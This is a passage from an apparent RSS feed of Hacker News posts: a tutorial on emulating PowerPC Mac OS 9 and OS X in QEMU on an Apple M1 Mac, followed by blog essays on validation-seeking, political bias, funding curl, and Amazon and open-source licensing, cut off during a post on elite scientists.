<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>  <div itemprop="articleBody"> <section> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-13-macos9.png" alt="Mac OS 9 in QEMU"></p> <p>QEMU is an open-source emulator for virtualizing computers. Unlike VMWare, it's able to both virtualize CPUs and emulate various CPU instruction sets. It's pretty powerful, free, and has a macOS port. There are alternate versions and different ways to install it. Still, in this example, I'm using <a href="https://brew.sh/">Homebrew</a>, a package manager for macOS/OSX that allows you to install software via the CLI and manage easily. </p> <p>Now, this post wouldn't be very exciting if I tried this on my Mac Pro, but I decided to try it on my MacBook M1. Thus far, the community has succeeded in getting QEMU to install the ARM version Windows, so I decided to do the more silly path and get PPC and X86 working on Apple Silicon. I encountered very little resistance, which surprised me as I haven't seen/read anyone trying this route. It's surprsingly very usable but the usefulness is going to be limited. I was able to play Sim City 2000 on Mac OS 9.2 at a fairly high resolution. For the sake of brevity, I'm going to skip over installing Homebrew on an Apple M1, but you'll want to use the arch -x86_64 method, which requires prepending. I've gotten OS 10.0 and nearly gotten Windows 10 working on my M1.</p> <p> <iframe width="560" height="315" src="https://www.youtube.com/embed/aeSx4pm4MwY" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe> </p>  <p>Included below is the instruction for both Apple Silicon and Intel Macs.</p> <hr> <br> <h3>Requirements</h3> <ul> <li>Basic understanding of the terminal in OS X/macOS</li> <li>Apple Silicon (M1) computer (or Intel) Mac</li> <li>Xcode</li> <li>xcode-select (CLI Tools) <code>xcode-select --install</code></li> <li>Homebrew</li> </ul> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-13-osx.jpg" alt="Mac OS X in QEMU"></p> <h3>Step 1: Install QEMU</h3> <p>This is the only step where Apple Silicon and Intel Macs differ. You'll need to install the x86 version of QEMU for the Apple silicon macs first.</p> <h4>Apple Silicon</h4> <figure><pre><code data-lang="bash">    <span>arch</span> <span>-x86_64</span> brew <span>install </span>qemu </code></pre></figure> <h4>x86 Intel Macs</h4> <figure><pre><code data-lang="bash">    brew <span>install </span>qemu </code></pre></figure> <h3>Step 2: Create a disk image</h3> <p>The rest of the steps do not need any specification for M1 vs. Intel.</p> <p>You can specify a route, but I just used the default pathing, the 2G = 2 GB below. You can get away with much less for OS X OS 9. If you'd like more space, change the size of the simulated HDD. .</p> <figure><pre><code data-lang="bash">    qemu-img create <span>-f</span> qcow2 myimage.img 2G </code></pre></figure> <h3>Step 3: Launching the emulated computer and the tricky part: Formatting the HDD</h3> <p>Now that we have a blank hard disk image, we're ready to go.</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> d <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> path/to/disk/image  </code></pre></figure> <p>Let's break this down so it's not just magic. The first command is the qemu core emulator, you can use things like 64-bit x86 CPU <code>qemu-system-x86_64 </code> or a 32-bit CPU <code>qemu-system-i386 </code>, but we're using a PPC, so we are using <code>qemu-system-ppc</code>. </p> <p>Next, we're declaring PC bios with <code>-L pc-bios</code>, I'm unsure if this is necessary. This seems to be the default even in Mac QEMU. After that, the <code>-boot</code> flag declares the boot drive. For those who remember the days of yore, C is the default drive for PCs, D is the default for the CD-Rom like a PC. It's weird, I know. <code>-M</code> is the model flag. It's pretty esoteric, but <a href="http://people.redhat.com/pbonzini/qemu-test-doc/_build/html/topics/PowerPC-System-emulator.html">QEMU uses OpenBIOS</a>, and mac99 is the model for Beige G3s. The lowercase <code>-m</code> is memory, expressed in megabytes, but you can use 1G or 2G for 1 or 2 gigabytes like the format utility. <code>-hda</code> is the image we're using. Finally, <code>-cdrom</code> is the installer image</p> <h3>Step 3.5: Special considerations between operating systems</h3> <p>I discovered that OS X 10.0's installer has a significant flaw: It doesn't have a disk utility. The disk images are black disks thus have no file system. If you want to run OS X 10.0, you'll need to first launch an installer that can format HFS like OS 9 or later versions of OS X, run the disk utility, format the image and then exit out of the emulator. The process would look like this:</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> d <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> path/to/disk/macosx10.4 or macOS9  </code></pre></figure> <p>Then format the drive from the utility, quit the emulator (control-c on the terminal window).</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> d <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> path/to/disk/macosx10.0</code></pre></figure> <h3>Step 4: after the installer fininshes</h3> <p>You will end up seeing a failed boot screen after the installer finishes. This is normal. Either quit the QEMU instance or use control-c in the terminal to close it. Now that it's installed, we want to boot off the internal drive.</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> c <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img    </code></pre></figure> <p>MacOS 9 seems to do slightly better when adding the via=pmu and specifying the graphics.</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> c  <span>-M</span> mac99,via<span>=</span>pmu  <span>-g</span> 1024x768x32  <span>-m</span> 512 <span>-hda</span> os9.img  </code></pre></figure> <h3>Step 5: mounting disk images</h3> <p>There's not a lot to do with an OS without software. You can mount plenty of disk image formats</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> c <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> path/to/disk</code></pre></figure> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-13-simcity.jpg" alt="Sim City 2000 in QEMU on Apple Silicon"></p> <h3>Bonus round: Trying for x86 64 Windows 10</h3> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-13-proof.jpg" alt="Windows in QEMU on Apple Silicon"></p> <h3>Step 6: Multi CD-Rom Installs or swapping Disk Images</h3> <p>Older applications and OS installers require mutliple disk images. This can be done from via the CLI inside QEMU.</p> <p>On the QEMU window press:</p> <ul> <li>Control-Alt-2 to bring up the console</li> <li><code>change ide1-cd0 /path/to/image</code></li> <li>Control-Alt-1 to bring back the GUI</li> </ul> <p>Thus far my Windows 10 experiment has been a lot less successful, I've gotten through the installer (it's unbearably slow) but it seems to hand on booting. It looks very feasible. I might have better luck using the 32 bit verison of windows.</p> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-12-windows10.png" alt="Windows in QEMU on Apple Silicon"></p> <figure><pre><code data-lang="bash">qemu-system-x86_64  <span>-L</span> pc-bios <span>-boot</span> d <span>-m</span> 2048 <span>-hda</span> myimage.img <span>-cdrom</span>  Win10_20H2_v2_English_x64.iso  </code></pre></figure> </section> </div> </div></div>]]>
            </description>
            <link>http://blog.greggant.com//posts/2021/01/13/install-powerpc-macos-osx-on-apple-silicon-m1-and-x86-intel.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788542</guid>
            <pubDate>Fri, 15 Jan 2021 08:55:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Seeking Constant Validation]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25788328">thread link</a>) | @hgarg
<br/>
January 15, 2021 | https://harishgarg.com/writing/on-seeking-validation/ | <a href="https://web.archive.org/web/*/https://harishgarg.com/writing/on-seeking-validation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>We crave validation, all the time. It never stops.</p>
<p>We crave validation from ourselves, other humans, even our pets, and our environment.</p>
<p>This craving for validation starts from a young age. We learn to seek it. Constantly. At Home. At School. At the workplace.</p>
<p>We seek it from our Parents. Our siblings. Our Friends. Our Boss, Our Co-workers. Strangers on the internet.</p>
<p>This need for validation is an endless loop. The more we get it, the more we crave it.  It’s hacking our brains. And it has received a massive boost from online social networks.</p>
<p>We post a tweet, and start staring at the Notifications, waiting for that blue dot to appear. </p>
<p>Every time it’s delayed by seconds, we feel a little bit sad at not getting that fix right away. </p>
<p>Time it shows up, we feel validated for posting that tasty morsel of a sentence.</p>
<p>We feel heartbroken that not enough people have upvoted our product on Product Hunt</p>
<p>Why didn’t enough people vote on my Hacker News Post?(I launched a whole product around this need.)</p>
<p>We envy the Reddit Mods(nay Gods) who decide if people can see our post. </p>
<p>Constantly staring at the Follower count.</p>
<p>Mood going up and down along with the trend lines in the graph.</p>
<p>We are hooked.</p>
<p>PS: You can indulge my validation need :-) by following me on <a target="_blank" rel="noopener" href="https://twitter.com/harishkgarg">Twitter</a> where I share lot of the updates. If you want to receive an email alert when I write a new post, subscribe <a target="_blank" rel="noopener" href="https://marvelous-experimenter-4753.ck.page/f3e3f76dd0">here</a></p>

  </div></div>]]>
            </description>
            <link>https://harishgarg.com/writing/on-seeking-validation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788328</guid>
            <pubDate>Fri, 15 Jan 2021 08:22:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Politics is the Mind-Killer (2007)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25788275">thread link</a>) | @sundarurfriend
<br/>
January 15, 2021 | https://www.readthesequences.com/Politics-Is-The-Mind-Killer | <a href="https://web.archive.org/web/*/https://www.readthesequences.com/Politics-Is-The-Mind-Killer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikitext">



<p> ❦
</p>
<p>People go funny in the head when talking about politics. The evolutionary reasons for this are so obvious as to be worth belaboring: In the ancestral environment, politics was a matter of life and death. And sex, and wealth, and allies, and reputation… When, today, you get into an argument about whether “we” ought to raise the minimum wage, you’re executing adaptations for an ancestral environment where being on the wrong side of the argument could get you killed. Being on the <em>right</em> side of the argument could let <em>you</em> kill your hated rival!
</p>
<p>If you want to make a point about science, or rationality, then my advice is to not choose a domain from <em>contemporary</em> politics if you can possibly avoid it. If your point is inherently about politics, then talk about Louis XVI during the French Revolution. Politics is an important domain to which we should individually apply our rationality—but it’s a terrible domain in which to <em>learn</em> rationality, or discuss rationality, unless all the discussants are already rational.
</p>
<p>Politics is an extension of war by other means. Arguments are soldiers. Once you know which side you’re on, you must support all arguments of that side, and attack all arguments that appear to favor the enemy side; otherwise it’s like stabbing your soldiers in the back—providing aid and comfort to the enemy. People who would be level-headed about evenhandedly weighing all sides of an issue in their professional life as scientists, can suddenly turn into slogan-chanting zombies when there’s a <a href="https://www.readthesequences.com/A-Fable-Of-Science-And-Politics">Blue or Green</a> position on an issue.
</p>
<p>In Artificial Intelligence, and particularly in the domain of nonmonotonic reasoning, there’s a standard problem: “All Quakers are pacifists. All Republicans are not pacifists. Nixon is a Quaker and a Republican. Is Nixon a pacifist?”
</p>
<p>What on Earth was the point of choosing this as an example? To rouse the political emotions of the readers and distract them from the main question? To make Republicans feel unwelcome in courses on Artificial Intelligence and discourage them from entering the field? (And no, I am not a Republican. Or a Democrat.)
</p>
<p>Why would anyone pick such a <em>distracting</em> example to illustrate nonmonotonic reasoning? Probably because the author just couldn’t resist getting in a good, solid dig at those hated Greens. It feels so <em>good</em> to get in a hearty punch, y’know, it’s like trying to resist a chocolate cookie.
</p>
<p>As with chocolate cookies, not everything that feels pleasurable is good for you.
</p>
<p>I’m not saying that I think we should be apolitical, or even that we should adopt Wikipedia’s ideal of the <a href="https://en.wikipedia.org/wiki/Wikipedia:Neutral_point_of_view" rel="nofollow">Neutral Point of View</a>. But try to resist getting in those good, solid digs if you can possibly avoid it. If your topic legitimately relates to attempts to ban evolution in school curricula, then go ahead and talk about it—but don’t blame it explicitly on the whole Republican Party; some of your readers may be Republicans, and they may feel that the problem is a few rogues, not the entire party. As with Wikipedia’s <span>npov</span>, it doesn’t matter whether (you think) the Republican Party really <em>is</em> at fault. It’s just better for the spiritual growth of the community to discuss the issue without invoking color politics.
</p>


</div></div>]]>
            </description>
            <link>https://www.readthesequences.com/Politics-Is-The-Mind-Killer</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788275</guid>
            <pubDate>Fri, 15 Jan 2021 08:15:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Food on the table while giving away source code]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25788122">thread link</a>) | @nixcraft
<br/>
January 14, 2021 | https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I founded the curl project early 1998 but had already then been working on the code since <a href="https://daniel.haxx.se/blog/2021/01/03/age-is-just-a-number-or-two/" data-type="post" data-id="15434">November 1996</a>. The source code was always open, free and available to the world. The term “open source” actually wasn’t even coined until early 1998,  just weeks before curl was born.</p>



<div><figure><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png" alt="" width="125" height="108" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png 789w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-200x175.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-450x394.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-768x672.png 768w" sizes="(max-width: 125px) 100vw, 125px"></figure></div>



<p>In the beginning of course, the first few years or so, this project wasn’t seen or discovered by many and just grew slowly and silently in a dusty corner of the Internet.</p>



<p>Already when I shipped the first versions I wanted the code to be open and freely available. For years I had seen the cool free software put out the in the world by others and I wanted my work to help build this communal treasure trove.</p>



<h2>License</h2>



<p>When I started this journey I didn’t really know what I wanted with curl’s license and exactly what rights and freedoms I wanted to give away and it took a few years and attempts before it landed.</p>



<p>The early versions were <a href="https://opensource.org/licenses/GPL-2.0">GPL licensed</a>, but as I learned about resistance from proprietary companies and thought about it further, I changed the license to be more commercially friendly and to match my conviction better. I ended up with <a href="https://opensource.org/licenses/MIT">MIT</a> after a brief experimental time using <a href="https://opensource.org/licenses/MPL-1.1">MPL</a>. (It was easy to change the license back then because I owned all the copyrights at that point.)</p>



<p>To be exact: we actually have a <a href="https://curl.se/docs/copyright.html">slightly modified MIT license</a> with some very subtle differences. The reason for the changes have been forgotten and we didn’t get those commits logged in the “big transition” to Sourceforge that we did in late 1999…  The end result is that this is now often recognized as “the curl license”, even though it is in effect the MIT license.</p>



<p>The license says everyone can use the code for whatever purpose and nobody is required to ship any source code to anyone, but they cannot claim they wrote it themselves and the license/use of the code should be mentioned in documentation or another relevant location.</p>



<p>As licenses go, this has to be one of the most frictionless ones there is.</p>



<h2>Copyright</h2>



<p>Open source relies on a solid copyright law and the copyright owners of the code are the only ones who can license it away. For a long time I was the sole copyright owner in the project. But as I had decided to stick to the license, I saw no particular downsides with allowing code and contributors (of significant contributions) to retain their copyrights on the parts they brought. To not use that as a fence to make contributions harder.</p>



<p>Today, in early 2021, I count 1441 copyright strings in the curl source code git repository. 94.9% of them have my name.</p>



<p>I never liked how some projects require copyright assignments or license agreements etc to be able to submit code or patches. Partly because of the huge administrative burden it adds to the project, but also for the significant friction and barrier to entry they create for new contributors and the unbalance it creates; some get more rights than others. I’ve always worked on making it easy and smooth for newcomers to start contributing to curl. It doesn’t happen by accident.</p>



<h2>Spare time</h2>



<p>In many ways, running a spare time open source project is easy. You just need a steady income from a “real” job and sufficient spare time, and maybe a server to host stuff on for the online presence.</p>



<p>The challenge is of course to keep developing it, adding things people want, to help users with problems and to address issues timely. Especially if you happen to be lucky and the user amount increases and the project grows in popularity.</p>



<p>I ran curl as a spare time project for decades. Over the years it became more and more common that users who submitted bug reports or asked for help about things were actually doing that during their <em>paid</em> work hours because they used  curl in a commercial surrounding – which sometimes made the situation almost absurd. The ones who actually got paid to work with curl were asking the unpaid developers to help them out.</p>



<p>I changed employers several times. I started my own company and worked as my own boss for a while. I worked for Mozilla on network stuff in Firefox for five years. But curl remained a spare time project because I couldn’t figure out how to turn it into a job without risking the project or my economy.</p>



<h2>Earning a living</h2>



<p>For many years it was a pipe dream for me to be able to work on curl as a real job. But how do I actually take the step from a spare time project to doing it full time? I give away all the code for free, and it is a solid and reliable product.</p>



<div><figure><a href="https://www.wolfssl.com/"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo.png" alt="" width="186" height="144" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo.png 1011w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-200x155.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-450x348.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-768x594.png 768w" sizes="(max-width: 186px) 100vw, 186px"></a></figure></div>



<p>The initial seeds were planted when I met and got to know Larry (wolfSSL CEO) and some of the other good people at <a href="https://www.wolfssl.com/">wolfSSL</a> back in the early 2010s. This, because wolfSSL is a company that write open source libraries and offer commercial support for them – proving that it can work as a business model. Larry always told me he thought there was a possibility waiting here for me with curl.</p>



<p>Apart from the business angle, if I would be able to work more on curl it could really benefit the curl project, and then of course indirectly everyone who uses it.</p>



<p>It was still a step to take. When <a href="https://daniel.haxx.se/blog/2018/11/18/im-leaving-mozilla/" data-type="post" data-id="11748">I gave up on Mozilla</a> in 2018, it just took a little thinking before I decided to try it. <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">I joined wolfSSL</a> to work on curl full time. A dream came true and finally curl was not just something I did “on the side”. It only took 21 years from first curl release to reach that point…</p>



<p>I’m living the open source dream, working on the project I created myself.</p>



<h2>Food for free code</h2>



<p>We sell commercial support for curl and libcurl. Companies and users that need a helping hand or swift assistance with their problems can get it from us – and with me here I dare to claim that there’s no company anywhere else with the same ability. We can offload engineering teams with their curl issues. Up to 24/7 level!</p>



<p>We also offer custom curl development, debugging help, porting to new platforms and basically any other curl related activity you need. See more on the <a href="https://www.wolfssl.com/products/curl/">curl product page</a> on the wolfSSL site.</p>



<p>curl (mostly in the shape of libcurl) runs in <strong>ten billion installations</strong>: some five, six billion mobile phones and tablets – used by several of the most downloaded apps in existence, in virtually every website and Internet server. In a billion computer games, a billion Windows machines, half a billion TVs, half a billion game consoles and in a few hundred million cars… curl has been made to run on 82 operating systems on 22 CPU architectures. Very few software components can claim a wider use.</p>



<p><em>“Isn’t it easier to list companies that are <strong>not</strong> using curl?”</em></p>



<p>Wide use and being recognized does not bring food on the table. curl is also totally free to download, build and use. It is very solid and stable. It performs well, is documented, well tested and “battle hardened”. It “just works” for most users.</p>



<h2>Pay for support!</h2>



<p>How to convince companies that they should get a curl support contract with me?</p>



<p>Paying customers get to influence what I work on next. Not only distant road-mapping but also how to prioritize short term bug-fixes etc. We have a guaranteed response-time.</p>



<p>You get your issues first in line to get fixed. Customers also won’t risk getting their issues added the known bugs document and put in the attic to be forgotten. We can help customers make sure their application use libcurl correctly and in the best possible way.</p>



<p>I try to emphasize that by getting support from us, customers can  take away some of those tasks from their own engineers and because we are  faster and better on curl related issues, that is a pure net gain economically. For all of us.</p>



<p><strong>This is not an easy sell.</strong></p>



<p>Sure, curl is used by thousands of companies everywhere, but most of them do it because it’s free (in all meanings of the word), functional and available. There’s a real challenge in identifying those that actually use it enough and  value the functionality enough that they realize they want to improve their curl foo.</p>



<p>Most of our curl customers purchased support first when they faced a complicated issue or problem they couldn’t fix themselves –  this fact gives me this weird (to the wider curl community) incentive to <em>not</em> fix some problems too fast, because it then makes it work against my ability to gain new customers!</p>



<p>We need paying customers for this to be sustainable. When wolfSSL has a sustainable curl business, I get paid and the work I do in curl benefits all the curl users; paying as well as non-paying.</p>



<h2>Dual license</h2>



<p>There’s clearly business in releasing open source under a strong copyleft license such as GPL, and as long as you keep the copyrights, offer customers to purchase that same code under another more proprietary- friendly  license. The code is still open source and anyone doing totally open things can still use it freely and at no cost.</p>



<p>We’ve shipped <a href="https://curl.se/tiny/">tiny-curl</a> to the world licensed under GPLv3. Tiny-curl is a curl branch with a strong focus on the<em><strong> </strong></em><strong>tiny</strong> part: the idea is to provide a libcurl more suitable for smaller systems, the ones that can’t even run a full Linux but rather use an RTOS.</p>



<p>Consider it a sort of experiment. Are users interested in getting a smaller curl onto their products and are they interested in paying for licensing. So far, tiny-curl supports two separate RTOSes for which we haven’t ported the “normal” curl to.</p>



<h2>Keeping things separate</h2>



<p>Maybe you don’t realize this, but I work hard to keep separate things compartmentalized. I am not curl, curl is not wolfSSL and wolfSSL is not me.  But we  all overlap greatly!</p>



<figure><a href="https://daniel.haxx.se/blog/wp-content/uploads/2021/01/curl-circles.jpg"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2021/01/curl-circles.jpg" alt="" width="599" height="562"></a><figcaption>The Daniel + curl + wolfSSL trinity</figcaption></figure>



<p>I work for wolfSSL. I work on curl. wolfSSL offers commercial curl support.</p>



<h2>Reserved features</h2>



<p>One idea that we haven’t explored much yet is the ability to make and offer “reserved features” to paying customers only. This of course as another motivation for companies to become curl support customers.</p>



<p>Such reserved features would still have to be sensible for the curl project …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/">https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/</a></em></p>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2021/01/15/food-on-the-table-while-giving-away-code/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25788122</guid>
            <pubDate>Fri, 15 Jan 2021 07:49:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The problem with Amazon and Open Source isn’t Amazon (2019)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25787965">thread link</a>) | @pabs3
<br/>
January 14, 2021 | https://anonymoushash.vmbrasseur.com/2019/06/07/the-problem-with-amazon-and-open-source-isnt-amazon/ | <a href="https://web.archive.org/web/*/https://anonymoushash.vmbrasseur.com/2019/06/07/the-problem-with-amazon-and-open-source-isnt-amazon/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        <header>
          
          
          <p><strong> </strong> <time datetime="2019-06-07T12:23:10-07:00">June 07, 2019</time></p>
          
          
            <p> 




  5 minute read

</p>
          
        </header>
      

      <section itemprop="text">
        
        <figure>

<p><a href="https://www.flickr.com/photos/elainegreycats/5979877429/sizes/m/"><img src="https://live.staticflickr.com/6122/5979877429_6b7db5903a.jpg" alt="Wrong Way" width="500" height="333"></a>
</p><figcaption>‘Wrong Way’ by Elaine with Grey Cats on Flickr; CC-BY</figcaption></figure>

<p><em>Recently a friend wrote asking me “what’s up with Amazon and open source?” and “is there a chance these new licenses will be approved by OSI?” What follows is my reply.</em></p>

<hr>

<p>There’s been a rash of open source project relicensing happening the past few months, and in nearly every case the company making the licensing change is claiming that that they’re doing it to protect the project in question from Amazon.</p>

<p>That is a big steaming pile of bullshit.</p>

<p>First of all: There is absolutely <em>nothing</em> wrong with how Amazon is using these open source projects. They are operating completely and entirely within the bounds of the licenses of the projects. Fingers need to be wagged here, but not at Amazon.</p>

<p>These projects are not being relicensed to protect them from Amazon. Claiming that they are is at best naive and at worst wilfully lying. These companies are relicensing projects to cover for the fact that they are ignorant of how to run a successful business. They knowingly released their secret sauce under permissive licenses and have discovered that doing so means that competitors can create more compelling product offerings based upon the same technology. This is entirely in accordance not only with the licenses that these companies knowingly chose, but also with a competitive market. The only problem with this is that it came as a surprise to these “open source” companies and now they’re reacting poorly.</p>

<p>If these companies actually cared about the <em>projects</em>, they would have invested the resources to build stronger communities around them. They would have reached out to Amazon, encouraged them to contribute back to the projects, and helped them to do so. They would NOT have taken the few community contributions—and you will find that most of these projects do not have many contributions from outside of the originating company, showing how poorly they managed their communities—they would not have taken these contributions from community members and then locked them behind proprietary licenses, violating the trust of their community.</p>

<p>You will find that none of the companies that have relicensed their projects address any of these issues. They don’t discuss how they tried to engage Amazon in their communities, how their attempts fell on deaf ears or were rebuffed. They can’t do this because thus far there is no evidence to show they even tried. I know a lot of the <a href="https://aws.amazon.com/blogs/opensource/">open source leadership at Amazon</a>. They’re good people who care deeply about free and open source and who are working to do the right thing by all of the communities of the projects they build upon. They would have been very open to hearing how they could make a positive difference in those communities. They’re a relatively few people across a very large company, so it may have taken a bit more time to get those contribution balls rolling, but they would have worked very hard to do so…had they been approached.</p>

<p>So don’t fall into the trap of unquestionably believing the recent spate of anti-Amazon propaganda. It comes from, without exception, companies that simply do not appear to understand how to operate successful businesses. From what I can tell, they’ve received poor advice from their VCs. Not knowing any better, they understandably followed this advice and now they’re paying the price.</p>

<p>As far as whether there’s any chance these new licenses will be OSI approved, I answer a pretty definitive “no.” There are two reasons for this. First of all, these companies would have to <a href="https://opensource.org/approval">submit the licenses for review</a>. OSI does not just go looking for licenses to review. License creators must take the action to say, “Hey, this is a new license that we believe adheres to the <a href="https://opensource.org/osd-annotated">Open Source Definition</a>. It’s valuable to us and to the community that it be recognised as such. Could you please review it and confirm that?” So far only one company has tried that and they failed to get their license approved, because of the second reason…</p>

<p>In order to become OSI-approved, licenses must adhere to the <a href="https://opensource.org/osd-annotated">Open Source Definition (OSD)</a>. These new licenses do not. While the ways they diverge from the OSD are varied, the most common ones are that they violate either “6. No Discrimination Against Fields of Endeavor”, “8. License Must Not Be Specific to a Product”, “9. License Must Not Restrict Other Software”, or “10. License Must Be Technology-Neutral”.</p>

<p>#6 is the one most violated by these licenses. Restricting to non-commercial usage is fundamentally against the spirit of free and open source software. From the very beginning, Stallman himself was very emphatic that people be allowed to make money from free software. He and FOSS leaders after him realised that preventing people from making money from free and open source software will doom the movement. It is vitally important to FOSS that people be encouraged to use it in commercial and for-profit ventures. This will help foster the spread of FOSS. These licenses disregard both that and the benefit of this clause of the OSD to the whole of FOSS in preference to their own singular commercial needs.</p>

<p>In fact, the vibrant cloud-based and cloud-native environment within which most software companies operate now and which makes so much innovation possible (including that of these misled companies), exists because companies have released their technologies under OSI-approved licenses and have come together to collaborate on common and powerful tools. This is the culture that successful companies embrace. Even Microsoft, the former nemesis of free and open source, recognizes that this type of collaboration is critical to the continued growth and evolution of the company.</p>

<p>To be perfectly clear: There is nothing wrong with making money from software, FOSS or otherwise. Choosing to use a proprietary license for software is a valid business decision and one I support. Choosing to use an <a href="https://opensource.org/licenses">OSI-approved license</a> is an equally valid business decision and, again, one I support. However the license to choose for the software created by your company is just that: a <em>BUSINESS</em> decision.</p>

<p>There are many potential variables to consider and those variables will be different for each company, but “how will we make enough money from this to maintain and grow the company sustainably?” is one that is consistent across all of these decisions. If a company’s answer to that is, “we’ll just give away the software to bring in leads” but they don’t have a compelling enough commercial offering on top of that to convert those leads to sales, while their competitor converts those leads and more using the same technology, that is NOT the fault of open source software, licensing, or culture. That’s a company that doesn’t understand how to do business, and blaming Amazon isn’t going to change that.</p>

        
      </section>

      

      


      
  

    </div></div>]]>
            </description>
            <link>https://anonymoushash.vmbrasseur.com/2019/06/07/the-problem-with-amazon-and-open-source-isnt-amazon/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787965</guid>
            <pubDate>Fri, 15 Jan 2021 07:17:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Newton hypothesis: Is science done by a small elite?]]>
            </title>
            <description>
<![CDATA[
Score 102 | Comments 70 (<a href="https://news.ycombinator.com/item?id=25787745">thread link</a>) | @barry-cotter
<br/>
January 14, 2021 | https://nintil.com/newton-hypothesis | <a href="https://web.archive.org/web/*/https://nintil.com/newton-hypothesis">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>In previous posts I <a href="https://nintil.com/hhmi-and-nih">said</a> that the extent to which "Fund people" works will depend on the distribution of scientific talent. Think about the following situation: Imagine that only a handful of scientists at every point in time are able to –if given the time and means–lead revolutions on par with the work of Darwin, Einstein, or Galileo (This is an extreme case admittedly because most of science does not look like this; most of science is more incremental and less memorable). I recently found two authors that believe something like this,</p>
<p>Braben, whose <a href="https://nintil.com/review-scientific-freedom">book</a> <em>Scientific Freedom</em> I reviewed says that even though most scientists could be the next Einstein if they tried, only a few will even try:</p>
<blockquote>
<p>It is possible that my message may be seen as elitist and of interest only to <strong>those very few scientists who might be putative members of a twenty - first century Planck Club</strong>. That interpretation would be wrong. One of the themes here is that almost every serious researcher is at some time in a career capable of taking those fateful steps that might lead to a great discovery or the creation of penetrating new insight. They might then need to draw on vast reserves of courage and determination, and perhaps also a little luck if they are to make progress. At any one time, of course, <strong>the proportion of researchers ready to seize that possibly once - in - a - lifetime opportunity will be very small</strong>, so if they are prevented from doing so the democratic pressure they can exert is insignifican't. [...] a properly constituted TR initiative should appeal to only a small number of scientists with radical thoughts on their minds. The challenge is to recognize them as there are millions of scientists, and one does not even know which haystack hides the needle. [...] <strong>Let us assume that there were about 300 transformative researchers — the extended membership of the Planck Club — during the twentieth century.</strong></p>
</blockquote>
<p>In physics, <a href="https://www.amazon.com/Trouble-Physics-String-Theory-Science/dp/061891868X">Lee Smolin</a> is even more on the elitist side, with even fewer scientists in the revolutionaries' club:</p>
<blockquote>
